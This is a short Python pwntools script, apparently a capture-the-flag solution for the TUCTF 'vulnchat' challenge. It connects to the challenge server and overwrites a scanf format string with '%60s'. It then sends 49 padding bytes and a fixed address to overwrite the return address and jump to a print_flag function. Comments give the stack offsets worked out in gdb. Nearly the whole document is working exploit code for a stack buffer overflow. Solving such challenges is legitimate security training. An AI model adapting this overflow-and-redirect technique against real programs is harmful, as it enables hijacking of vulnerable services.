
#usr/bin/python

from pwn import *

r = remote("vulnchat.tuctf.com", 4141)

address_flag=0x0804856b  

print r.recvuntil(":")

payload = "A"*20 #buff
payload +="%60s" #overflow %30s >>> %60s
r.sendline(payload)

print r.recvuntil(":")

payload = "A"*49 #overflow buff2 
payload +=p32(address_flag) #return print_flag
r.sendline(payload)

print r.recv()
r.interactive()


#in gdb set buff2=v4, buff=v5, v6=format
#buff = 0x19-0x5=0x14 = 20 byte
#buff2 -> return_address = (ebp+4)-(ebp-0x2d)=  4-(-0x2d) = 4+0x2d = 0x31 = 49 byte
